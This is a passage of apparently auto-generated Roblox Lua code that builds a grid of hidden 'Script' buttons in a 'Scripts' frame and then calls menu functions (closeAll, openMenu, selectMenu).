Script_36.Font = Enum.Font.SourceSans
Script_36.Text = "Script"
Script_36.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_36.TextSize = 14.000

Script_37.Name = "Script"
Script_37.Parent = Scripts
Script_37.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_37.Position = UDim2.new(-1.34615386, 0, 11, 0)
Script_37.Size = UDim2.new(0, 52, 0, 19)
Script_37.Visible = false
Script_37.Font = Enum.Font.SourceSans
Script_37.Text = "Script"
Script_37.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_37.TextSize = 14.000

Script_38.Name = "Script"
Script_38.Parent = Scripts
Script_38.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_38.Position = UDim2.new(-2.59615374, 0, 11, 0)
Script_38.Size = UDim2.new(0, 52, 0, 19)
Script_38.Visible = false
Script_38.Font = Enum.Font.SourceSans
Script_38.Text = "Script"
Script_38.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_38.TextSize = 14.000

Script_39.Name = "Script"
Script_39.Parent = Scripts
Script_39.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_39.Position = UDim2.new(1.28846157, 0, 11, 0)
Script_39.Size = UDim2.new(0, 52, 0, 19)
Script_39.Visible = false
Script_39.Font = Enum.Font.SourceSans
Script_39.Text = "Script"
Script_39.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_39.TextSize = 14.000

Script_40.Name = "Script"
Script_40.Parent = Scripts
Script_40.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_40.Position = UDim2.new(-0.0192307234, 0, 11, 0)
Script_40.Size = UDim2.new(0, 52, 0, 19)
Script_40.Visible = false
Script_40.Font = Enum.Font.SourceSans
Script_40.Text = "Script"
Script_40.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_40.TextSize = 14.000

Script_41.Name = "Script"
Script_41.Parent = Scripts
Script_41.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_41.Position = UDim2.new(-2.59615374, 0, 9, 0)
Script_41.Size = UDim2.new(0, 52, 0, 19)
Script_41.Visible = false
Script_41.Font = Enum.Font.SourceSans
Script_41.Text = "Script"
Script_41.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_41.TextSize = 14.000

Script_42.Name = "Script"
Script_42.Parent = Scripts
Script_42.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_42.Position = UDim2.new(-1.34615386, 0, 9, 0)
Script_42.Size = UDim2.new(0, 52, 0, 19)
Script_42.Visible = false
Script_42.Font = Enum.Font.SourceSans
Script_42.Text = "Script"
Script_42.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_42.TextSize = 14.000

Script_43.Name = "Script"
Script_43.Parent = Scripts
Script_43.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_43.Position = UDim2.new(1.28846157, 0, 9, 0)
Script_43.Size = UDim2.new(0, 52, 0, 19)
Script_43.Visible = false
Script_43.Font = Enum.Font.SourceSans
Script_43.Text = "Script"
Script_43.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_43.TextSize = 14.000

Script_44.Name = "Script"
Script_44.Parent = Scripts
Script_44.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_44.Position = UDim2.new(-0.0192307234, 0, 9, 0)
Script_44.Size = UDim2.new(0, 52, 0, 19)
Script_44.Visible = false
Script_44.Font = Enum.Font.SourceSans
Script_44.Text = "Script"
Script_44.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_44.TextSize = 14.000

Script_45.Name = "Script"
Script_45.Parent = Scripts
Script_45.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_45.Position = UDim2.new(1.28846157, 0, 6.85714245, 0)
Script_45.Size = UDim2.new(0, 52, 0, 19)
Script_45.Visible = false
Script_45.Font = Enum.Font.SourceSans
Script_45.Text = "Script"
Script_45.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_45.TextSize = 14.000

Script_46.Name = "Script"
Script_46.Parent = Scripts
Script_46.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_46.Position = UDim2.new(-2.59615374, 0, 6.85714245, 0)
Script_46.Size = UDim2.new(0, 52, 0, 19)
Script_46.Visible = false
Script_46.Font = Enum.Font.SourceSans
Script_46.Text = "Script"
Script_46.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_46.TextSize = 14.000

Script_47.Name = "Script"
Script_47.Parent = Scripts
Script_47.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_47.Position = UDim2.new(-0.0192307234, 0, 6.85714245, 0)
Script_47.Size = UDim2.new(0, 52, 0, 19)
Script_47.Visible = false
Script_47.Font = Enum.Font.SourceSans
Script_47.Text = "Script"
Script_47.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_47.TextSize = 14.000

Script_48.Name = "Script"
Script_48.Parent = Scripts
Script_48.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_48.Position = UDim2.new(-1.34615386, 0, 6.85714245, 0)
Script_48.Size = UDim2.new(0, 52, 0, 19)
Script_48.Visible = false
Script_48.Font = Enum.Font.SourceSans
Script_48.Text = "Script"
Script_48.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_48.TextSize = 14.000

Script_49.Name = "Script"
Script_49.Parent = Scripts
Script_49.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_49.Position = UDim2.new(-2.59615374, 0, 4.85714245, 0)
Script_49.Size = UDim2.new(0, 52, 0, 19)
Script_49.Visible = false
Script_49.Font = Enum.Font.SourceSans
Script_49.Text = "Script"
Script_49.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_49.TextSize = 14.000

Script_50.Name = "Script"
Script_50.Parent = Scripts
Script_50.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_50.Position = UDim2.new(-1.34615386, 0, 4.85714245, 0)
Script_50.Size = UDim2.new(0, 52, 0, 19)
Script_50.Visible = false
Script_50.Font = Enum.Font.SourceSans
Script_50.Text = "Script"
Script_50.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_50.TextSize = 14.000

Script_51.Name = "Script"
Script_51.Parent = Scripts
Script_51.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_51.Position = UDim2.new(-0.0192307234, 0, 4.85714245, 0)
Script_51.Size = UDim2.new(0, 52, 0, 19)
Script_51.Visible = false
Script_51.Font = Enum.Font.SourceSans
Script_51.Text = "Script"
Script_51.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_51.TextSize = 14.000

Script_52.Name = "Script"
Script_52.Parent = Scripts
Script_52.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_52.Position = UDim2.new(1.28846157, 0, 4.85714245, 0)
Script_52.Size = UDim2.new(0, 52, 0, 19)
Script_52.Visible = false
Script_52.Font = Enum.Font.SourceSans
Script_52.Text = "Script"
Script_52.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_52.TextSize = 14.000

Script_53.Name = "Script"
Script_53.Parent = Scripts
Script_53.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_53.Position = UDim2.new(1.28846157, 0, 2.64285707, 0)
Script_53.Size = UDim2.new(0, 52, 0, 19)
Script_53.Visible = false
Script_53.Font = Enum.Font.SourceSans
Script_53.Text = "Script"
Script_53.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_53.TextSize = 14.000

Script_54.Name = "Script"
Script_54.Parent = Scripts
Script_54.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_54.Position = UDim2.new(-0.0192307234, 0, 2.64285707, 0)
Script_54.Size = UDim2.new(0, 52, 0, 19)
Script_54.Visible = false
Script_54.Font = Enum.Font.SourceSans
Script_54.Text = "Script"
Script_54.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_54.TextSize = 14.000

Script_55.Name = "Script"
Script_55.Parent = Scripts
Script_55.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_55.Position = UDim2.new(-1.34615386, 0, 2.64285707, 0)
Script_55.Size = UDim2.new(0, 52, 0, 19)
Script_55.Visible = false
Script_55.Font = Enum.Font.SourceSans
Script_55.Text = "Script"
Script_55.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_55.TextSize = 14.000

Script_56.Name = "Script"
Script_56.Parent = Scripts
Script_56.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_56.Position = UDim2.new(-2.59615374, 0, 2.64285707, 0)
Script_56.Size = UDim2.new(0, 52, 0, 19)
Script_56.Visible = false
Script_56.Font = Enum.Font.SourceSans
Script_56.Text = "Script"
Script_56.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_56.TextSize = 14.000

closeAll()
openMenu()
selectMenu()
